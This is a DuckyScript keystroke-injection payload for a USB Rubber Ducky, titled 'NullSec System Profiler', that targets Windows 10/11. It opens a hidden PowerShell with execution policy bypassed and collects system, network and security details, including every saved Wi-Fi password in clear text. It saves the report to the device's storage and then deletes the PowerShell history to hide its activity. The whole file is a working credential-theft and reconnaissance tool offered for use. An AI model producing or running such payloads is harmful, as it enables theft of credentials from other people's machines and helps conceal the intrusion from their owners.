REM ====================================================
REM Title:         NullSec System Profiler
REM Author:        NullSec (bad-antics)
REM Description:   Comprehensive system reconnaissance
REM                Collects hardware, software, network,
REM                and security configuration details.
REM                Saves report to Ducky mass storage.
REM Target:        Windows 10/11
REM Version:       1.1
REM Category:      Recon
REM ====================================================

DEFINE #LABEL DUCKY

REM Use PASSIVE_WINDOWS_DETECT for reliable keystroke timing
EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        Windows fully passive OS Detection and passive Detect Ready
        Includes its own passive detect ready.
        Does not require additional extensions.

        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay
            $_OS will be set to WINDOWS or NOT_WINDOWS
            See end of payload for usage within payload
    END_REM

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF

END_EXTENSION

IF ($_OS != WINDOWS) THEN
    REM Not a Windows host — bail out cleanly
    STOP_PAYLOAD
END_IF

REM Open PowerShell hidden
GUI r
DELAY 300
STRINGLN powershell -ExecutionPolicy Bypass -WindowStyle Hidden
DELAY 1000

REM Find the Ducky drive
STRINGLN $d=(Get-CimInstance Win32_LogicalDisk|?{$_.VolumeName -eq '#LABEL'}).DeviceID;if(!$d){$d=$env:TEMP}
DELAY 300

REM Build comprehensive report
STRINGLN $r=@();$r+="=== NULLSEC SYSTEM PROFILER ==="
DELAY 100
STRINGLN $r+="Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
DELAY 100
STRINGLN $r+="Hostname: $env:COMPUTERNAME"
DELAY 100
STRINGLN $r+="Username: $env:USERNAME"
DELAY 100
STRINGLN $r+="Domain: $env:USERDOMAIN"
DELAY 100

REM OS Information
STRINGLN $r+="`n=== OPERATING SYSTEM ==="
DELAY 100
STRINGLN $os=Get-CimInstance Win32_OperatingSystem;$r+="OS: $($os.Caption) $($os.Version)"
DELAY 100
STRINGLN $r+="Build: $($os.BuildNumber) | Arch: $($os.OSArchitecture)"
DELAY 100
STRINGLN $r+="Install Date: $($os.InstallDate)"
DELAY 100
STRINGLN $r+="Last Boot: $($os.LastBootUpTime)"
DELAY 100

REM Hardware
STRINGLN $r+="`n=== HARDWARE ==="
DELAY 100
STRINGLN $cpu=Get-CimInstance Win32_Processor;$r+="CPU: $($cpu.Name) ($($cpu.NumberOfCores) cores)"
DELAY 200
STRINGLN $ram=Get-CimInstance Win32_PhysicalMemory|Measure-Object -Property Capacity -Sum;$r+="RAM: $([math]::Round($ram.Sum/1GB,2)) GB"
DELAY 200
STRINGLN Get-CimInstance Win32_DiskDrive|%{$r+="Disk: $($_.Model) - $([math]::Round($_.Size/1GB,1)) GB"}
DELAY 200
STRINGLN $gpu=Get-CimInstance Win32_VideoController;$r+="GPU: $($gpu.Name)"
DELAY 200

REM Network
STRINGLN $r+="`n=== NETWORK ==="
DELAY 100
STRINGLN Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne '127.0.0.1'}|%{$r+="IP: $($_.IPAddress)/$($_.PrefixLength) ($($_.InterfaceAlias))"}
DELAY 300
STRINGLN $r+="Gateway: $((Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop)"
DELAY 200
STRINGLN $dns=Get-DnsClientServerAddress -AddressFamily IPv4|Select-Object -ExpandProperty ServerAddresses -Unique;$r+="DNS: $($dns -join ', ')"
DELAY 200
STRINGLN $r+="Public IP: $((Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content)"
DELAY 500

REM WiFi Profiles
STRINGLN $r+="`n=== WIFI PROFILES ==="
DELAY 100
STRINGLN $profiles=netsh wlan show profiles|Select-String 'All User Profile'|%{($_ -split ':')[1].Trim()};$r+="Saved Networks: $($profiles.Count)"
DELAY 300
STRINGLN foreach($p in $profiles){try{$key=netsh wlan show profile name="$p" key=clear|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()};$r+="  $p : $key"}catch{}}
DELAY 1000

REM Security
STRINGLN $r+="`n=== SECURITY ==="
DELAY 100
STRINGLN $av=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue;$r+="AV: $($av.displayName -join ', ')"
DELAY 200
STRINGLN $fw=Get-NetFirewallProfile|%{"$($_.Name):$($_.Enabled)"};$r+="Firewall: $($fw -join ', ')"
DELAY 200
STRINGLN $r+="UAC: $((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA)"
DELAY 200
STRINGLN $r+="BitLocker: $((Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue).ProtectionStatus)"
DELAY 200

REM Installed Software
STRINGLN $r+="`n=== INSTALLED SOFTWARE (Top 30) ==="
DELAY 100
STRINGLN Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Sort-Object InstallDate -Descending|Select-Object -First 30|%{$r+="  $($_.DisplayName) v$($_.DisplayVersion)"}
DELAY 500

REM Running Processes
STRINGLN $r+="`n=== TOP PROCESSES (by memory) ==="
DELAY 100
STRINGLN Get-Process|Sort-Object WorkingSet64 -Descending|Select-Object -First 15|%{$r+="  $($_.ProcessName) - $([math]::Round($_.WorkingSet64/1MB,1)) MB (PID: $($_.Id))"}
DELAY 300

REM Save report
STRINGLN $r+= "`n=== END REPORT ==="
DELAY 100
STRINGLN $r -join "`n"|Out-File "$d\system_profile_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -Encoding UTF8
DELAY 500

REM WARNING: The following line deletes ALL PowerShell history.
REM Comment out if you want to preserve command history.
STRINGLN Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

STRINGLN exit
